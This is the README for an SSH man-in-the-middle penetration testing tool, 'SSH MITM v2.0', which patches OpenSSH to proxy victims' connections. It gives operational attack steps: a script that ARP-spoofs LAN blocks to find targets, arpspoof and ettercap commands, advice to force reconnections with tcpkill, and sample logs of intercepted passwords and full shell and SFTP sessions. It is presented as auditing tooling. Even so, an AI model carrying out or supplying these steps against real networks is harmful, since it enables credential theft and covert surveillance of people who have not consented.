# SSH MITM v2.0

Author: [Joe Testa](https://www.positronsecurity.com/company/) ([@therealjoetesta](https://twitter.com/therealjoetesta))


## Overview

This penetration testing tool allows an auditor to intercept SSH connections.  A patch applied to the OpenSSH v7.5p1 source code causes it to act as a proxy between the victim and their intended SSH server; all plaintext passwords and sessions are logged to disk.

Of course, the victim's SSH client will complain that the server's key has changed.  But because 99.99999% of the time this is caused by a legitimate action (OS re-install, configuration change, etc), many/most users will disregard the warning and continue on.

**NOTE:** Only run the modified *sshd_mitm* in a VM or container!  Ad-hoc edits were made to the OpenSSH sources in critical regions, with no regard to their security implications.  Its not hard to imagine these edits introduce serious vulnerabilities.


## Change Log

* v2.0: August ??, 2017: Added full SFTP support(!) and AppArmor confinement.
* v1.1: July 6, 2017: Removed root privilege dependencies, added automatic installer, added Kali Linux support, added *JoesAwesomeSSHMITMVictimFinder.py* script to find potential targets on a LAN.
* v1.0: May 16, 2017: Initial revision.


## To Do

The following list tracks areas to improve:

* Add port forwarding support.
* Create wrapper script that detects when user is trying to use key authentication only, and de-spoof them automatically.


## Initial Setup

As root, run the *install.sh* script.  This will install prerequisites from the repositories, download the OpenSSH archive, verify its signature, compile it, and initialize a non-privileged environment to execute within.


## Finding Targets

The *JoesAwesomeSSHMITMVictimFinder.py* script makes finding targets on a LAN very easy.  It will ARP spoof a block of IPs and sniff for SSH traffic for a short period of time before moving on to the next block.  Any ongoing SSH connections originating from devices on the LAN are reported.

By default, *JoesAwesomeSSHMITMVictimFinder.py* will ARP spoof and sniff only 5 IPs at a time for 20 seconds before moving onto the next block of 5.  These parameters can be tuned, though a trade-off exists: the more IPs that are spoofed at a time, the greater the chance you will catch an ongoing SSH connection, but also the greater the strain you will put on your puny network interface.  Under too high of a load, your interface will start dropping frames, causing a denial-of-service and greatly raising suspicions (this is bad).  The defaults shouldn't cause problems in most cases, though it'll take longer to find targets.  The block size can be safely raised on low-utilization networks.

Example:

    # ./JoesAwesomeSSHMITMVictimFinder.py --interface enp0s3 --ignore-ips 10.11.12.50,10.11.12.53
    Found local address 10.11.12.141 and adding to ignore list.
    Using network CIDR 10.11.12.141/24.
    Found default gateway: 10.11.12.1
    IP blocks of size 5 will be spoofed for 20 seconds each.
    The following IPs will be skipped: 10.11.12.50 10.11.12.53 10.11.12.141


    Local clients:
      * 10.11.12.70 -> 174.129.77.155:22
      * 10.11.12.43 -> 10.11.99.2:22

The above output shows that two devices on the LAN have created SSH connections (10.11.12.43 and 10.11.12.70); these can be targeted for a man-in-the-middle attack.  Note, however, that in order to potentially intercept credentials, you'll have to wait for them to initiate new connections.  Impatient pentesters may opt to forcefully close existing SSH sessions (using the *tcpkill* tool), prompting clients to create new ones immediately...


## Running The Attack

1.) Once you've completed the initial setup and found a list of potential victims (see above), execute *start.sh* as root.  This will start *sshd_mitm*, enable IP forwarding, and set up SSH packet interception through *iptables*.

2.) ARP spoof the target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't likely be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):

    arpspoof -r -t 192.168.x.1 192.168.x.5

Alternatively, you can use the *ettercap* tool:

    ettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//

3.) Monitor *auth.log*.  Intercepted passwords will appear here:

    sudo tail -f /var/log/auth.log

4.) Once a session is established, a full log of all input & output can be found in */home/ssh-mitm/*.  SSH sessions are logged as *shell_session_\*.txt*, and SFTP sessions are logged as *sftp_session_\*.html* (with transferred files stored in a corresponding directory).


## Sample Results

Upon success, */var/log/auth.log* will have lines that log the password, like this:

    Sep 11 19:28:14 showmeyourmoves sshd_mitm[16798]: INTERCEPTED PASSWORD: hostname: [10.199.30.x]; username: [jdog]; password: [supercalifragilistic] [preauth]

Furthermore, the victim's entire SSH session is logged:

    # cat /home/ssh-mitm/shell_session_0.txt
    Hostname: 10.199.30.x
    Username: jdog
    Password: supercalifragilistic
    -------------------------
    Last login: Thu Aug 31 17:42:38 2017
    OpenBSD 6.1 (GENERIC.MP) #21: Wed Aug 30 08:21:38 CEST 2017

    Welcome to OpenBSD: The proactively secure Unix-like operating system.

    Please use the sendbug(1) utility to report bugs in the system.
    Before reporting a bug, please try to reproduce it with the latest
    version of the code.  With bug reports, please try to ensure that
    enough information to reproduce the problem is enclosed, and if a
    known fix for it exists, include that as well.

    jdog@jefferson ~ $ ppss
      PID TT  STAT       TIME COMMAND
    59264 p0  Ss      0:00.02 -bash (bash)
    52132 p0  R+p     0:00.00 ps
    jdog@jefferson ~ $ iidd
    uid=1000(jdog) gid=1000(jdog) groups=1000(jdog), 0(wheel)
    jdog@jefferson ~ $ sssshh  jjtteessttaa@@mmaaggiiccbbooxx
    jtesta@magicbox's password: ROFLC0PTER!!1juan


Note that the characters in the user's commands appear twice in the file because the input from the user is recorded, as well as the output from the shell (which echoes characters back).  Observe that when programs like *sudo* and *ssh* temporarily disable echoing in order to read a password, duplicate characters are not logged.

All SFTP activity is captured as well.  Use a browser to view *sftp_session_0.html*.  It contains a log of commands, with links to files uploaded and downloaded:

    <html><pre>Hostname: 10.199.30.x
    Username: jdog
    Password: supercalifragilistic
    -------------------------
    > realpath "." (Result: /home/jdog)
    > realpath "/home/jdog/." (Result: /home/jdog)
    > ls /home/jdog
    drwxr-xr-x    4 jdog     jdog         4096 Sep 11 16:12 .
    drwxr-xr-x    4 root     root         4096 Sep  6 11:53 ..
    -rw-r--r--    1 jdog     jdog         3771 Aug 31  2015 .bashrc
    -rw-r--r--    1 jdog     jdog          220 Aug 31  2015 .bash_logout
    drwx------    2 jdog     jdog         4096 Sep  6 11:54 .cache
    -rw-r--r--    1 jdog     jdog          655 May 16 08:49 .profile
    drwx------    2 jdog     jdog         4096 Sep  8 16:59 .ssh
    -rw-rw-r--    1 jdog     jdog      5242880 Sep  8 15:52 file
    -rw-rw-r--    1 jdog     jdog        43131 Sep 10 10:47 file2
    -rw-rw-r--    1 jdog     jdog           83 Sep  6 12:56 file3
    -rw-rw-r--    1 jdog     jdog      3048960 Sep 11 13:51 file4

    > realpath "/home/jdog/file5" (Result: /home/jdog/file5)
    > put <a href="sftp_session_0/file5">/home/jdog/file5</a>
    > realpath "/home/jdog/file5" (Result: /home/jdog/file5)
    > stat "/home/jdog/file5" (Result: flags: 15; size: 854072; uid: 1001; gid: 1001; perm: 0100664, atime: 1505172831, mtime: 1505172831)
    > setstat "/home/jdog/file5" (Result: flags: 4; size: 0; uid: 0; gid: 0; perm: 0100700, atime: 0, mtime: 0)
    </pre></html>


## Developer Documentation

In *lol.h* are two defines: *DEBUG_HOST* and *DEBUG_PORT*.  Enable them and set the hostname to a test server.  Now you can connect to *sshd_mitm* directly without using ARP spoofing in order to test your changes, e.g.:

    ssh -p 2222 valid_user_on_debug_host@debug_host

To test out changes to the OpenSSH source code, use the *dev/redeploy.sh* script.

To see a diff of uncommitted changes, use the *dev/make_diff_of_uncommitted_changes.sh* script.

To re-generate a full patch to the OpenSSH sources, use the *dev/regenerate_patch.sh* script.
